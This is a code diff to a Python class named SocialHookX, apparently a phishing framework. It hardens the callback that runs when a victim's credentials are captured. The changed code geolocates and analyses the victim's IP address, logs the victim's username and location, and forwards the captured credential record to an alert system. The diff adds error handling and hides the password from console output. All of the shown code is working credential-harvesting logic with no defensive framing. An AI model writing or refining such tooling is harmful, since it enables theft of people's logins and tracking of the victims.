@@ -74,21 +74,28 @@ class SocialHookX:
     def _on_credential_captured(self, credential_dict, cred_id):
         """Callback when credential is captured"""
         try:
+            if cred_id <= 0:
+                logger.error("Failed to store credential")
+                return
+            
             # Get geolocation
-            ip = credential_dict.get('ip_address')
-            geo_data = self.geo_tracker.get_location(ip)
+            ip = credential_dict.get('ip_address', 'unknown')
+            geo_data = self.geo_tracker.get_location(ip) or {}
             
             # Analyze IP
             analysis = self.ip_analyzer.analyze_ip(ip)
             
-            # Log to console
-            print_success(f"[CRED] {credential_dict.get('template')} - {credential_dict.get('username')} from {geo_data.get('city')}, {geo_data.get('country')}")
+            # Log to console (sanitized - no password)
+            username = credential_dict.get('username', credential_dict.get('email', 'unknown'))
+            city = geo_data.get('city', 'Unknown')
+            country = geo_data.get('country', 'Unknown')
+            print_success(f"[CRED] {credential_dict.get('template')} - {username} from {city}, {country}")
             
-            # Send alerts
+            # Send alerts (don't expose full credential dict)
             self.alert_manager.notify_credential(credential_dict)
         
         except Exception as e:
-            logger.error(f"Error in credential callback: {e}")
+            logger.error(f"Error in credential callback: {e}", exc_info=True)
     
     def _on_visitor_tracked(self, visitor_dict, visitor_id):
         """Callback when visitor is tracked"""
